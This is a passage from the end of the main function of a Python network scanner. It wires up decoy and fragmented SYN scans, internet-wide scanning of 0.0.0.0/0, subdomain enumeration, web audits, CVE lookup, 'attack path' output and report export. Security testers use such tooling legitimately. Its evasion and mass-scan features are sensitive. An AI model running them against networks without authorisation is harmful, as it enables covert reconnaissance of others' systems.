                CYAN))

    # [ENH-9] Parse --decoys argument
    args._decoy_ips: Optional[List[str]] = None
    decoys_arg = getattr(args, "decoys", "")
    if decoys_arg:
        if args.scan_type != "syn":
            print(color("[!] --decoys requires --scan-type syn", YELLOW))
            args.decoys = ""
        else:
            if decoys_arg.startswith("rand:"):
                n = int(decoys_arg[5:])
                args._decoy_ips = [_random_decoy_ip() for _ in range(n)]
            else:
                args._decoy_ips = [d.strip() for d in decoys_arg.split(",")
                                   if d.strip()]
            print(color(
                f"[*] Decoy scan: ENABLED  "
                f"({len(args._decoy_ips)} decoys: "
                f"{', '.join(args._decoy_ips[:3])}"
                f"{'...' if len(args._decoy_ips) > 3 else ''})",
                CYAN))

    # [ENH-10] Fragment flag
    if getattr(args, "fragment", False):
        if args.scan_type != "syn":
            print(color("[!] --fragment requires --scan-type syn", YELLOW))
            args.fragment = False
        else:
            print(color(
                "[*] IP fragmentation: ENABLED  "
                "(SYN split across 2 IP fragments, TCP header split at byte 8)",
                CYAN))

    # [ENH-11] Permutation engine
    if getattr(args, "permute", False):
        seed = getattr(args, "permute_seed", None)
        if seed is None:
            seed = random.randint(0, 2**31 - 1)
        args._perm_seed = seed
        print(color(
            f"[*] Target permutation: ENABLED  "
            f"(ZMap cyclic-group, seed={seed})",
            CYAN))
    else:
        args._perm_seed = getattr(args, "permute_seed", None)

    # [ENH-1] Activate adaptive congestion controller
    global _CONGESTION
    if getattr(args, "adaptive", False) or t_level >= 4:
        initial_rate = args.rate if args.rate > 0 else 200.0
        _CONGESTION = CongestionController(
            initial_rate=initial_rate,
            initial_para=args.threads)
        _CONGESTION.install_as_rate_limiter()
        print(color(
            f"[*] Adaptive congestion control: ENABLED "
            f"(initial rate={initial_rate:.0f}pps, slow-start ON)", CYAN))

    # [V9-2] Worker server mode
    if getattr(args, "worker_server", False):
        port = getattr(args, "worker_port", 9876)
        srv  = DistributedWorkerServer(host="0.0.0.0", port=port)
        srv.start()   # blocks forever
        sys.exit(0)

    # [V9-2] Distributed scan mode
    if getattr(args, "distributed", False):
        ports = parse_ports(args.ports) if args.ports else [80, 443, 22]
        ds    = DistributedScanner(
            workers     = getattr(args, "workers", 4),
            timeout     = args.timeout,
            scan_type   = args.scan_type,
            banner_grab = getattr(args, "banner", False),
        )
        # Resolve targets
        all_targets: List[str] = []
        for t in args.targets:
            if "/" in t:
                all_targets.extend(expand_cidr(t))
            else:
                ip = resolve_host(t)
                if ip:
                    all_targets.append(ip)
        dist_summary = ds.scan(all_targets, ports)
        ds.print_results(dist_summary)
        # Save to JSON if requested
        if args.output and args.output.endswith(".json"):
            import json as _json
            with open(args.output, "w") as f:
                _json.dump(dist_summary, f, indent=2)
            print(color(f"[+] Distributed results → {args.output}", GREEN))
        sys.exit(0)

    # [ENH-17] Standalone subdomain enumeration
    if getattr(args, "subdomain", None):
        domain   = args.subdomain
        wordlist = None
        wl_path  = getattr(args, "subdomain_wordlist", None)
        if wl_path:
            try:
                with open(wl_path) as wf:
                    wordlist = [l.strip() for l in wf if l.strip()]
            except Exception as e:
                print(color(f"[!] Could not read wordlist: {e}", YELLOW))
        print(color(f"[ENH-17] Enumerating subdomains of {domain}...", CYAN))
        subs = enumerate_subdomains(domain, wordlist=wordlist)
        if subs:
            print(color(f"  Found {len(subs)} subdomains:", GREEN))
            for s in subs:
                cname_s = f"  → {s.cname}" if s.cname else ""
                print(f"  {s.subdomain:<45} {s.ip}{cname_s}")
        else:
            print(color("  No subdomains found.", YELLOW))
        sys.exit(0)

    # [ENH-18] Standalone web audit
    if getattr(args, "web_audit", None):
        url = args.web_audit
        print(color(f"[ENH-18] Web audit: {url}", CYAN))
        findings = web_audit(url, timeout=args.timeout)
        if findings:
            print(color(f"  {len(findings)} findings:", GREEN))
            for f in findings:
                sev_col = {
                    "CRITICAL": RED, "HIGH": YELLOW,
                    "MEDIUM": CYAN, "LOW": WHITE, "INFO": WHITE
                }.get(f.severity, WHITE)
                print(color(f"  [{f.severity}] {f.finding_type}: {f.url}", sev_col))
                print(f"        {f.detail}")
        else:
            print(color("  No findings.", GREEN))
        sys.exit(0)

    # [ENH-20] Autonomous scan mode
    if getattr(args, "auto", False):
        phases_raw = getattr(args, "auto_phases", None)
        phases = None
        if phases_raw:
            try:
                phases = [int(x) for x in phases_raw.split(",")]
            except ValueError:
                pass
        auto = AutonomousScanner(
            targets    = " ".join(args.targets),
            domain     = getattr(args, "auto_domain", None),
            output_dir = getattr(args, "auto_dir", "."),
            timeout    = args.timeout,
            rate_pps   = args.rate if args.rate > 0 else 500,
            use_nvd    = getattr(args, "nvd", False),
            verbose    = args.verbose,
            phases     = phases,
        )
        auto.run()
        sys.exit(0)

    # [ENH-21] Internet-scale scan
    if getattr(args, "internet_scan", False):
        if args.scan_type != "syn":
            print(color("[!] --internet-scan requires --scan-type syn", RED))
            sys.exit(1)
        ports = parse_ports(args.ports) if args.ports else [80, 443, 22]
        internet_scale_scan(
            ports          = ports,
            cidr           = getattr(args, "internet_cidr", "0.0.0.0/0"),
            rate_pps       = getattr(args, "internet_rate", 1000),
            timeout        = args.timeout,
            checkpoint_dir = getattr(args, "internet_checkpoint", None),
            resume_from    = getattr(args, "internet_resume", None),
            exclude_file   = getattr(args, "internet_exclude", None),
            permute_seed   = getattr(args, "_perm_seed", None),
        )
        sys.exit(0)

    scanner = PyScanner(args)
    summary = scanner.run()

    # [ENH-15] AI recon attack paths post-scan
    if getattr(args, "ai_recon", False):
        for hr in summary.results:
            print_attack_paths(hr, verbose=args.verbose)

    # [ENH-14] CVE lookup post-scan
    if getattr(args, "cve", False):
        use_nvd = getattr(args, "nvd", False)
        print(color("\n[ENH-14] CVE Lookup Results:", CYAN))
        found_any = False
        for hr in summary.results:
            for port, pr in hr.ports.items():
                if pr.state == "open" and pr.version:
                    cves = run_cve_lookup(pr.version, use_nvd=use_nvd)
                    if cves:
                        found_any = True
                        print(color(
                            f"  {hr.ip}:{port} ({pr.version})", YELLOW))
                        for cve in cves[:5]:
                            col = RED if cve.severity == "CRITICAL" else YELLOW
                            print(color(
                                f"    {cve.cve_id} [{cve.severity} CVSS:{cve.cvss:.1f}]"
                                f"  {cve.description[:80]}", col))
        if not found_any:
            print(color("  No CVEs matched (run --banner first to collect versions).",
                        WHITE))

    # [V9-6] Topology analysis
    if getattr(args, "topology", False) or len(summary.results) > 1:
        topo = TopologyAnalyzer(summary.results)
        topo.print_tree()

    # [ENH-19] Visual map post-scan
    map_path = getattr(args, "map", None)
    if map_path:
        export_d3_map(summary.results, map_path,
                       gateway=getattr(args, "map_gateway", None))
        dot_path = map_path.replace(".html", ".dot")
        export_graphviz_map(summary.results, dot_path,
                             gateway=getattr(args, "map_gateway", None))
        print(color(f"[ENH-19] Network map → {map_path}", GREEN))
        print(color(f"[ENH-19] Graphviz    → {dot_path}", GREEN))
    if getattr(args, "map_ascii", False):
        print(color("\n" + export_ascii_map(
            summary.results,
            gateway=getattr(args, "map_gateway", None)), CYAN))

    # [ENH-16] HTML report
    html_out = getattr(args, "output_html", None) or ""
    if html_out:
        export_html_report(summary.results, html_out,
                            use_nvd=getattr(args, "nvd", False))
        print(color(f"[ENH-16] HTML report → {html_out}", GREEN))

    # Output formats
    if args.output:
        if args.output.endswith(".json"):
            export_json(summary, args.output)
        elif args.output.endswith(".xml"):
            export_xml(summary, args.output)
        elif args.output.endswith(".csv"):
            export_csv(summary, args.output)
        else:
            export_text(summary, args.output)

    # Additional explicit format flags
    xml_out = getattr(args, "output_xml", "") or ""
    csv_out = getattr(args, "output_csv", "") or ""
    if xml_out:
        export_xml(summary, xml_out)
    if csv_out:
        export_csv(summary, csv_out)


if __name__ == "__main__":
    main()
